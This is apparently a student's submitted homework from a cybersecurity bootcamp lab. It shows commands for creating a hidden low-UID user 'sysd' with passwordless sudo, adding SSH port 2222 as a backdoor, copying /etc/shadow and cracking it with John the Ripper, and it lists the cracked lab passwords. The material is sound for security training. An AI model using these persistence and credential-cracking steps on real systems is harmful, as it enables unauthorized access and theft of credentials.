## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:

- useradd --no-create-home sysd

2. Give your secret user a password:

 - passwd sysd 

3. Give your secret user a system UID < 1000:

- less /etc/passwd ---- Show existing UID to get a vacant number
- usermod -u 401 sysd

4. Give your secret user the same GID:

- groupmod -g 401 sysd

5. Give your secret user full `sudo` access without the need for a password:

- visudo
- sysd ALL(ALL:ALL) NOPASSWD:ALL ----append to file.


6. Test that `sudo` access works without your password:

- su sysd ----> change to sysd user
- sudo apt update ----> Test sysd user.

    ```bash
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

# Vagrant Privs for config
vagrant ALL=(ALL) NOPASSWD:ALL
sysadmin  ALL=(ALL:ALL) /usr/bin/less

# Elevate sysd permissions
sysd ALL=(ALL:ALL) NOPASSWD:ALL

    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

- nano /etc/ssh/sshd_config

    ```bash

#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Port 22
Port 2222
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:

- systemctl restart sshd

2. Exit the `root` account:

- exit -----> type exit and "Enter" until you get to "sysadmin@UbuntuDesktop"

3. SSH to the target machine using your `sysd` account and port `2222`:

- ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:

- sudo -s

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

- ssh sysd@192.168.6.105 -p 2222


2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

- cd /etc
- cp shadow shadow_copy
- john shadow_copy
-------
computer         (stallman)
freedom          (babbage)
trustno1         (mitnik)
dragon           (lovelace)
lakers           (turing)
passw0rd         (sysadmin)
-------

- john --show shadow_copy

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

